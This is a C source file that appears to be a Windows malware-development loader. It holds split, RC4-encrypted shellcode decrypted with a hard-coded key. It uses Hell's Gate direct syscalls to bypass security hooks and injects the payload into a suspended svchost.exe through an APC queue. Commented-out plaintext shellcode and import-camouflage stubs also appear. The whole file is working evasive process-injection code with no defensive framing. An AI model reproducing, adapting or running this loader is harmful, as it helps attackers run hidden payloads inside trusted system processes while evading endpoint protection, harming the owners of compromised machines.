# include <Windows.h>
# include <stdio.h>
# include "sysfn032.h"
# include "NtFunction.h"
# include "Hashing.h"


EXTERN_C VOID HellsGate(DWORD dwSSN);
EXTERN_C NTSTATUS HellDescent(...);

BOOL RunViaApcInjection(IN HANDLE hThread, IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, PNT_API_TABLE pNtApiTable) {
	PVOID pAddress = NULL;
	DWORD dwOldProtection = NULL;
	HellsGate(pNtApiTable->NtAllocateVirtualMemory.dwSSN);
	HellDescent(hProcess, &pAddress, 0, &sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//SysNtAllocateVirtualMemory(hProcess, &pAddress, 0, &sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//pAddress = VirtualAllocEx(hProcess, NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		//printf("\t[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	HellsGate(pNtApiTable->NtWriteVirtualMemory.dwSSN);
	HellDescent(hProcess, pAddress, pPayload, sPayloadSize, NULL);
	//SysNtWriteVirtualMemory(hProcess, pAddress, pPayload, sPayloadSize, NULL);

	//if (!WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, NULL)) {
	//	//printf("\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
	//	return FALSE;
	//}

	HellsGate(pNtApiTable->NtProtectVirtualMemory.dwSSN);
	HellDescent(hProcess, &pAddress, &sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection);
	//SysNtProtectVirtualMemory(hProcess, &pAddress, &sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection);

	//if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
	//	//printf("\t[!] VirtualProtect Failed With Error : %d \n", GetLastError());
	//	return FALSE;
	//}

	//if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
	//	//printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
	//	return FALSE;
	//}
	HellsGate(pNtApiTable->NtQueueApcThread.dwSSN);
	HellDescent(hThread, (PPS_APC_ROUTINE)pAddress, NULL, NULL, NULL);
	//SysNtQueueApcThread(hThread, (PPS_APC_ROUTINE)pAddress, NULL, NULL, NULL);
	return TRUE;
}

BOOL CreateSuspendedProcess(IN LPCSTR lpProcessPath, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	si.cb = sizeof(STARTUPINFOA);

	if (!CreateProcessA(NULL, (LPSTR)lpProcessPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		//printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	*dwProcessId = pi.dwProcessId;
	*hProcess = pi.hProcess;
	*hThread = pi.hThread;

	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL) {
		return TRUE;
	}

	return FALSE;
}

//unsigned char sc_0[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51";
//const unsigned char sc_1[] = "\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52";
//unsigned char sc_2[] = "\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0";
//const unsigned char sc_3[] = "\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed";
//unsigned char sc_4[] = "\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88";
//const unsigned char sc_5[] = "\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44";
//unsigned char sc_6[] = "\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48";
//const unsigned char sc_7[] = "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1";
//unsigned char sc_8[] = "\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44";
//const unsigned char sc_9[] = "\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49";
//unsigned char sc_10[] = "\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a";
//const unsigned char sc_11[] = "\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41";
//unsigned char sc_12[] = "\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00";
//const unsigned char sc_13[] = "\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b";
//unsigned char sc_14[] = "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff";
//const unsigned char sc_15[] = "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47";
//unsigned char sc_16[] = "\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x6e\x6f\x74\x65\x70";
//const unsigned char sc_17[] = "\x61\x64\x2e\x65\x78\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
//
//unsigned char sc[18 * 16];
//void build_sc() {
//	memcpy(&sc[0], sc_0, 16);
//	memcpy(&sc[16 * 1], sc_1, 16);
//	memcpy(&sc[16 * 2], sc_2, 16);
//	memcpy(&sc[16 * 3], sc_3, 16);
//	memcpy(&sc[16 * 4], sc_4, 16);
//	memcpy(&sc[16 * 5], sc_5, 16);
//	memcpy(&sc[16 * 6], sc_6, 16);
//	memcpy(&sc[16 * 7], sc_7, 16);
//	memcpy(&sc[16 * 8], sc_8, 16);
//	memcpy(&sc[16 * 9], sc_9, 16);
//	memcpy(&sc[16 * 10], sc_10, 16);
//	memcpy(&sc[16 * 11], sc_11, 16);
//	memcpy(&sc[16 * 12], sc_12, 16);
//	memcpy(&sc[16 * 13], sc_13, 16);
//	memcpy(&sc[16 * 14], sc_14, 16);
//	memcpy(&sc[16 * 15], sc_15, 16);
//	memcpy(&sc[16 * 16], sc_16, 16);
//	memcpy(&sc[16 * 17], sc_17, 16);
//}

//unsigned char sc_0[] = "\x03\xEE\xBE\x07\xD5\x19\x86\x44\x1D\xD1\xF6\xE5\xC4\x58\x73\x87\x50\xDF\x6E\xCD\x91\x65\x77\x49\x4C\x5C\xAC\xA1";
//const unsigned char sc_1[] = "\x89\x55\x37\x6D\x6B\x64\xA8\x1E\x0B\xDE\x10\xBF\x73\xF6\xF8\x75\xD5\xC8\x02\x22\x32\xDA\xF9\xBE\xB8\xC2\xA4\x9A";
//unsigned char sc_2[] = "\x26\x6F\x40\xD9\xFD\x92\x67\xEB\xAD\x52\xDB\x75\xE7\xE3\x62\xDD\x4C\x6D\xD0\x53\x17\x52\xCE\xBE\x95\xC7\xCC\x1D";
//const unsigned char sc_3[] = "\xFE\x19\x08\xA2\x4A\xEA\xB4\xF4\x1A\x98\xFB\xDC\x5B\xF3\xB5\x6B\x6E\x2A\xB3\xB8\x2C\xFB\xAA\xD2\xF4\xDB\xA7\xDE";
//unsigned char sc_4[] = "\x59\xE3\xED\xB7\x9D\x34\x40\x75\xE2\x3A\xF7\xD8\x73\xBB\x7C\x79\xEC\x95\xC3\x8C\xBE\xB1\x07\x4F\x62\xB7\xED\x65";
//const unsigned char sc_5[] = "\x34\x7A\xB6\xB2\xA1\xC5\x08\xF3\x8C\xFB\x04\x87\xD8\xAD\x03\x77\xFD\x73\x80\x72\x8A\x3B\x23\x23\x74\x6A\xA2\xBD";
//unsigned char sc_6[] = "\xA7\x41\x5E\x48\x18\xDA\xCC\x14\x83\xC3\xE5\x7E\x37\x38\x11\xF7\x01\x96\xF0\x72\xE7\xAD\xD7\x32\xAB\x2F\x3A\x38";
//const unsigned char sc_7[] = "\xFA\x34\x22\x25\xDD\xC3\x10\xD4\x30\x34\xDF\x5D\x18\x37\x38\x04\x67\x58\x4B\xD8\x79\x2E\xD2\x4A\x70\x81\x3E\x0D";
//unsigned char sc_8[] = "\x8E\x18\xA8\x39\xD4\xEB\x2F\x1C\x0A\x58\x83\x5D\x07\xD8\x42\x8D\xB1\x66\x0A\x54\xD9\x70\x13\x04\x92\x12\xA7\x92";
//const unsigned char sc_9[] = "\x74\x7F\xF8\x5A\x03\x3E\xA3\x0A\xA7\xEF\x63\xD5\x32\x5C\xF4\xF2\x6C\xFD\x0F\x79\x2B\xC1\x63\xBD\x2C\x58\x4A";
//
//unsigned char sc[28 * 9 + 27] = { 0 };
//void build_sc() {
//    memcpy(&sc[0], sc_0, 28);
//    memcpy(&sc[28 * 1], sc_1, 28);
//    memcpy(&sc[28 * 2], sc_2, 28);
//    memcpy(&sc[28 * 3], sc_3, 28);
//    memcpy(&sc[28 * 4], sc_4, 28);
//    memcpy(&sc[28 * 5], sc_5, 28);
//    memcpy(&sc[28 * 6], sc_6, 28);
//    memcpy(&sc[28 * 7], sc_7, 28);
//    memcpy(&sc[28 * 8], sc_8, 28);
//    memcpy(&sc[28 * 9], sc_9, 27);
//}


unsigned char sc_0[] = "\x03\xEE\xBE\x07\xD5\x19\x86\x44\x1D\xD1\xF6\xE5\xC4\x58\x73\x87\x50\xDF\x6E\xCD\x91\x65\x77\x49\x4C\x5C\xAC\xA1";
const unsigned char sc_1[] = "\x89\x55\x37\x6D\x6B\x64\xA8\x1E\x0B\xDE\x10\xBF\x73\xF6\xF8\x75\xD5\xC8\x02\x22\x32\xDA\xF9\xBE\xB8\xC2\xA4\x9A";
unsigned char sc_2[] = "\x26\x6F\x40\xD9\xFD\x92\x67\xEB\xAD\x52\xDB\x75\xE7\xE3\x62\xDD\x4C\x6D\xD0\x53\x17\x52\xCE\xBE\x95\xC7\xCC\x1D";
const unsigned char sc_3[] = "\xFE\x19\x08\xA2\x4A\xEA\xB4\xF4\x1A\x98\xFB\xDC\x5B\xF3\xB5\x6B\x6E\x2A\xB3\xB8\x2C\xFB\xAA\xD2\xF4\xDB\xA7\xDE";
unsigned char sc_4[] = "\x59\xE3\xED\xB7\x9D\x34\x40\x75\xE2\x3A\xF7\xD8\x73\xBB\x7C\x79\xEC\x95\xC3\x8C\xBE\xB1\x07\x4F\x62\xB7\xED\x65";
const unsigned char sc_5[] = "\x34\x7A\xB6\xB2\xA1\xC5\x08\xF3\x8C\xFB\x04\x87\xD8\xAD\x03\x77\xFD\x73\x80\x72\x8A\x3B\x23\x23\x74\x6A\xA2\xBD";
unsigned char sc_6[] = "\xA7\x41\x5E\x48\x18\xDA\xCC\x14\x83\xC3\xE5\x7E\x37\x38\x11\xF7\x01\x96\xF0\x72\xE7\xAD\xD7\x32\xAB\x2F\x3A\x38";
const unsigned char sc_7[] = "\xFA\x34\x22\x25\xDD\xC3\x10\xD5\x34\x42\xAC\x6F\x47\x04\x0A\x04\x67\x51\x90\x1C\xF1\xC9\x9A\xCB\xDD\x9B\x0E\x86";
unsigned char sc_8[] = "\xE1\xD6\xDE\x09\x26\xA7\x98\xBE\x4D\x45\x33\xFB\x90\x6A\x9E\x26\x2D\xA7\x6D\xDC\x78\xBD\x54\xC2\xD4\xE5\x7A\x75";
const unsigned char sc_9[] = "\xFE\xAF\x0F\x94\xFA\x24\xCD\x61\xA7\xB6\x7B\x1D\x52\x8A\xA1\xF7\x03\x76\xBF\x59\x1A\xE8\x7C\x11\x19\x0C\x8A\x52";
unsigned char sc_10[] = "\xC0\xB8\xE4\x95\x3A\x38\x26\xB9\xC9\xE5\x86\xA0\xF9\x25\x91\x63\xAD\x05\xD3\x95\xA0\xEC\xB4\x7F\xEC\xB1\xF6\x93";
const unsigned char sc_11[] = "\x8A\xBF\x53\x11\x6C\xE0\xAC\x7A\xF4\x2B\x1A\x31\xDB\x6F\xF5\xDA\xA6\x14\x1D\xE1\xEB\xFB\x15\x77\x25\xA4\x32\xB7";
unsigned char sc_12[] = "\x0F\x2A\x6C\x40\xF5\xF6\x40\xBD\xEE\xE1\x31\x07\x7D\xB9\x0D\x03\xDB\x51\x9D\x4A\xBB\x13\x82\x37\x4A\x6F\x76\x9E";
const unsigned char sc_13[] = "\x9F\xB6\xBD\x89\xC7\x6C\x56\x7A\x6B\x42\xC4\x5E\x1B\xD6\x54\x7B\x9F\x25\x5D\xD2\x1B\xE2\x5B\xA5\x75\xA9\xBD\x1B";
unsigned char sc_14[] = "\xA9\x40\x55\xDC\x3D\x25\x43\x94\xF6\x8D\x71\xDA\x89\x9C\x97\x19\x66\x90\x90\xAC\x11\x4C\x10\xAC\xC6\x2E\xCD\x00";
const unsigned char sc_15[] = "\x4C\xAA\xA9\xF4\x01\x3A\x8C\x7A\x87\xE0\x4B\x05\x0B\x43\x01\x80\x10\x57\x0E\x23\xA8\x0F\x61\xE4\x45\x86\x7E\x2B";
unsigned char sc_16[] = "\x63\xA5\x0C\xD2\x2C\xE9\x5F\xFF\x12\xC1\xF5\xA7\x60";

unsigned char sc[28 * 16 + 13] = { 0 };
void build_sc() {
    memcpy(&sc[0], sc_0, 28);
    memcpy(&sc[28 * 1], sc_1, 28);
    memcpy(&sc[28 * 2], sc_2, 28);
    memcpy(&sc[28 * 3], sc_3, 28);
    memcpy(&sc[28 * 4], sc_4, 28);
    memcpy(&sc[28 * 5], sc_5, 28);
    memcpy(&sc[28 * 6], sc_6, 28);
    memcpy(&sc[28 * 7], sc_7, 28);
    memcpy(&sc[28 * 8], sc_8, 28);
    memcpy(&sc[28 * 9], sc_9, 28);
    memcpy(&sc[28 * 10], sc_10, 28);
    memcpy(&sc[28 * 11], sc_11, 28);
    memcpy(&sc[28 * 12], sc_12, 28);
    memcpy(&sc[28 * 13], sc_13, 28);
    memcpy(&sc[28 * 14], sc_14, 28);
    memcpy(&sc[28 * 15], sc_15, 28);
    memcpy(&sc[28 * 16], sc_16, 13);
}

int main() {
	////IatCamouflage();
	//unsigned __int64 i;
	////i = SetCriticalSectionSpinCount(NULL, NULL);
	//i = GetLastError();

	//i = GetWindowContextHelpId(NULL);
	//i = GetWindowLongPtrW(NULL, NULL);
	////i = RegisterClassW(NULL);
	//i = IsWindowVisible(NULL);
	//i = ConvertDefaultLocale(NULL);
	//i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
	//i = IsDialogMessageW(NULL, NULL);

	
	NT_API_TABLE NtApiTable = { 0 };
	GetNtApiTableInfo(&NtApiTable);
	BYTE key[] = "maldev123";
	//printf("[+] Enter to execute\n");
	//getchar();
	build_sc();
	Sleep(5000);
	if (!Rc4EncryptionViaSystemFunc032((PBYTE)key, (PBYTE)sc, sizeof(key), sizeof(sc))) {
		return -1;
	}
	DWORD dwProcessId;
	HANDLE hProcess, hThread;

	if (!CreateSuspendedProcess("C:\\Windows\\System32\\svchost.exe", &dwProcessId, &hProcess, &hThread)) {
		//printf("[!] CreateSuspendedProcess Failed\n");
		return -1;
	}
	
	if (!RunViaApcInjection(hThread, hProcess, sc, sizeof(sc), &NtApiTable)) {
		//printf("[!] RunViaApcInjection Failed\n");
		return -1;
	}

	HellsGate(NtApiTable.NtResumeThread.dwSSN);
	HellDescent(hThread, NULL);
	//MessageBoxA(NULL, NULL, NULL, NULL);
	//SysNtResumeThread(hThread, NULL);
	//ResumeThread(hThread);
	//DebugActiveProcessStop(dwProcessId);
}